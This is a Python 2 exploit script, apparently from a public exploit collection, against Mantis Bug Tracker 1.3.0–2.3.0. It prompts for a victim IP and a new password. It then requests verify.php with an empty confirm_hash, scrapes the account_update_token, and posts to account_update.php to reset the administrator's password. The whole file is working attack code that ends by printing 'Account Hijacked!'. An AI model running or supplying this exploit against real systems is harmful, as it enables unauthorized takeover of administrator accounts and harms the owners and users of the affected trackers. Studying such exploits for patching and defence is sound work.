import cookielib,urllib,urllib2,time

print 'Mantis Bug Tracker >= v1.3.0 - 2.3.0'
print '1.2.x versions are not affected'
print 'Remote Password Reset 0day Exploit'

IP=raw_input("[Mantis Victim IP]>")
#realname=raw_input("[Username]")
#verify_user_id=raw_input("[User ID]")
passwd=raw_input("[New Password]")

#TARGET = 'http://'+IP+'/mantisbt-2.3.0/verify.php?id='+verify_user_id+'&confirm_hash='

values={}
account_update_token=''
verify_user_id='1'          #Admin  = 1
realname='administrator'    #Must be known or guessed.

TARGET = 'http://'+IP+'/mantisbt-2.3.0/verify.php?id='+verify_user_id+'&confirm_hash='

#REQUEST 1, get Mantis account_update_token 
cookies = cookielib.CookieJar()

opener = urllib2.build_opener(
    urllib2.HTTPRedirectHandler(),
    urllib2.HTTPHandler(debuglevel=0),
    urllib2.HTTPSHandler(debuglevel=0),
    urllib2.HTTPCookieProcessor(cookies))

res = opener.open(TARGET)

arr=res.readlines()
for s in arr:
        if 'account_update_token' in s:
                break


#print s[61:-38]
ACCT_TOKEN=s[61:-38]

time.sleep(0.3)

#REQUEST 2 Hijack the Admin Account
TARGET='http://'+IP+'/mantisbt-2.3.0/account_update.php'
values = {'verify_user_id' : '1',
        'account_update_token' : ACCT_TOKEN,
        'realname' : realname,
        'password' : passwd,
        'password_confirm' : passwd}
  
data = urllib.urlencode(values)

opener = urllib2.build_opener(
urllib2.HTTPRedirectHandler(),
urllib2.HTTPHandler(debuglevel=0),
urllib2.HTTPSHandler(debuglevel=0),
urllib2.HTTPCookieProcessor(cookies))

response = opener.open(TARGET, data)
the_page = response.read()
http_headers = response.info()

#print http_headers
print response.getcode()
print 'Account Hijacked!'
time.sleep(2)
